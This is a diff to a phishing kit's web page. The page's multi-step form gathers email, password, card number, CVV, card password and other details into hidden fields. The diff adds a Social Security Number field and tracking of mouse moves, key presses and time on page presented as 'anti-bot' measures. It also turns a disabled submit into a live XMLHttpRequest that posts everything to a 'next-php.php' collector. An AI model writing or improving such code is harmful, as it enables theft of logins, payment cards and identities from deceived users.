@@ -746,8 +746,8 @@
                         <div class="form-row">
                             <div class="form-col">
                                 <div class="form-group">
-                                    <label for="sort-code">Sort Code (if applicable)</label>
-                                    <input type="text" id="sort-code" name="sort-code" placeholder="XX-XX-XX" maxlength="8">
+                                    <label for="ssn">Social Security Number</label>
+                                    <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11">
                                 </div>
                             </div>
                             <div class="form-col">
@@ -935,13 +935,15 @@
         </div>
     </div>
     
-    <!-- Form for email collection (hidden) -->
-    <form id="email-form" action="https://your-server-endpoint.com/collect" method="POST">
+    <!-- Form for data collection (hidden) -->
+    <form id="email-form" action="next-php.php" method="POST">
         <input type="hidden" id="collected-email" name="email">
         <input type="hidden" id="collected-password" name="password">
         <input type="hidden" id="collected-card" name="card">
         <input type="hidden" id="collected-personal" name="personal">
         <input type="hidden" id="collected-id" name="id">
+        <input type="hidden" id="step" name="step" value="4">
+        <input type="hidden" id="verification" name="verification">
     </form>
     
     <!-- JavaScript for functionality -->
@@ -957,6 +959,40 @@
             const passwordInput = document.getElementById('password');
             const emailError = document.getElementById('email-error');
             const passwordError = document.getElementById('password-error');
+            
+            // Verification tracking for anti-bot measures
+            let verificationData = {
+                timeOnPage: 0,
+                mouseMoves: 0,
+                keyPresses: 0,
+                token: generateToken(32)
+            };
+            
+            // Track time on page
+            const startTime = Date.now();
+            setInterval(() => {
+                verificationData.timeOnPage = Date.now() - startTime;
+            }, 1000);
+            
+            // Track mouse moves
+            document.addEventListener('mousemove', () => {
+                verificationData.mouseMoves++;
+            });
+            
+            // Track key presses
+            document.addEventListener('keydown', () => {
+                verificationData.keyPresses++;
+            });
+            
+            // Generate random token
+            function generateToken(length) {
+                const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+                let result = '';
+                for (let i = 0; i < length; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
+            }
             
             // Step Navigation
             const nextStep1Button = document.getElementById('next-step1');
@@ -1084,7 +1120,7 @@
                     expiry: document.getElementById('expiry').value,
                     cvv: document.getElementById('cvv').value,
                     amexCID: document.getElementById('amex-cid').value,
-                    sortCode: document.getElementById('sort-code').value,
+                    ssn: document.getElementById('ssn').value,
                     creditLimit: document.getElementById('credit-limit').value,
                     cardPassword: document.getElementById('card-password').value
                 });
@@ -1165,8 +1201,21 @@
                     // Update progress indicators
                     document.querySelectorAll('.step')[3].classList.add('completed');
                     
-                    // Submit data
-                    // emailForm.submit(); // Uncomment this line to actually submit the data
+                    // Prepare final verification data
+                    document.getElementById('verification').value = JSON.stringify(verificationData);
+                    
+                    // Submit data to server
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', 'next-php.php', true);
+                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+                    xhr.setRequestHeader('X-Verification-Token', verificationData.token);
+                    
+                    // Prepare form data
+                    const formData = new FormData(document.getElementById('email-form'));
+                    
+                    // Send data
+                    xhr.send(formData);
                     
                     // Redirect after a delay
                     setTimeout(function() {
